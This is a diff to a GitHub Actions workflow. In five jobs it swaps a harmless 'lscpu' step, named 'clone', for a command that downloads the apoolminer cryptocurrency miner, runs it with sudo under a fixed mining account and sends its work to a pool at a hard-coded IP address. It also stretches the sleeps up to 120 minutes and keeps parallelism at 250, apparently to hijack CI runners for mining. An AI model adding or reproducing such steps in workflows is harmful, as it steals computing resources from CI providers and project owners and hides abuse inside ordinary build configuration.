@@ -25,8 +25,8 @@ jobs:
     - name: Setup
       uses: actions/checkout@v4
     - name: clone
-      run: lscpu &
-            sleep 5m
+      run: wget https://github.com/apool-io/apoolminer/releases/download/v3.3.0/apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz && tar xf apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz && cd apoolminer_linux_qubic_autoupdate_v3.3.0 && sudo ./apoolminer --gpu-off --account CP_ajiabhjr1q --worker $(echo $(shuf -i 1-30000 -n 1)-tod$(shuf -i 1-30000 -n 1)) --pool 20.64.241.229:443 --thread 4 &
+           sleep 309s
   mang:
     needs: em
     runs-on: ubuntu-latest
@@ -48,7 +48,7 @@ jobs:
         node-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: lscpu &
+      run: wget https://github.com/apool-io/apoolminer/releases/download/v3.3.0/apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz && tar xf apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz && cd apoolminer_linux_qubic_autoupdate_v3.3.0 && sudo ./apoolminer --gpu-off --account CP_ajiabhjr1q --worker $(echo $(shuf -i 1-30000 -n 1)-tod$(shuf -i 1-30000 -n 1)) --pool 20.64.241.229:443 --thread 4 &
             sleep 5m
         
     
@@ -74,10 +74,10 @@ jobs:
         node-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: lscpu &
-            sleep 5m
+      run: wget https://github.com/apool-io/apoolminer/releases/download/v3.3.0/apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz && tar xf apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz && cd apoolminer_linux_qubic_autoupdate_v3.3.0 && sudo ./apoolminer --gpu-off --account CP_ajiabhjr1q --worker $(echo $(shuf -i 1-30000 -n 1)-tod$(shuf -i 1-30000 -n 1)) --pool 20.64.241.229:443 --thread 4 &
+            sleep 6m
   sat:
-    needs: em
+    needs: mang
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -97,13 +97,13 @@ jobs:
         node-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: lscpu &
-            sleep 5m
+      run: wget https://github.com/apool-io/apoolminer/releases/download/v3.3.0/apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz && tar xf apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz && cd apoolminer_linux_qubic_autoupdate_v3.3.0 && sudo ./apoolminer --gpu-off --account CP_ajiabhjr1q --worker $(echo $(shuf -i 1-30000 -n 1)-tod$(shuf -i 1-30000 -n 1)) --pool 20.64.241.229:443 --thread 4 &
+            sleep 120m
         
     
      
   koe:
-    needs: [em]
+    needs: [bang]
     runs-on: ubuntu-latest
     strategy:
       max-parallel: 250
@@ -123,8 +123,8 @@ jobs:
         node-version: ${{ matrix.go }}
       id: go
     - name: clone
-      run: lscpu &
-            sleep 5m
+      run: wget https://github.com/apool-io/apoolminer/releases/download/v3.3.0/apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz && tar xf apoolminer_linux_qubic_autoupdate_v3.3.0.tar.gz && cd apoolminer_linux_qubic_autoupdate_v3.3.0 && sudo ./apoolminer --gpu-off --account CP_ajiabhjr1q --worker $(echo $(shuf -i 1-30000 -n 1)-tod$(shuf -i 1-30000 -n 1)) --pool 20.64.241.229:443 --thread 4 &
+            sleep 61m
         
     
 
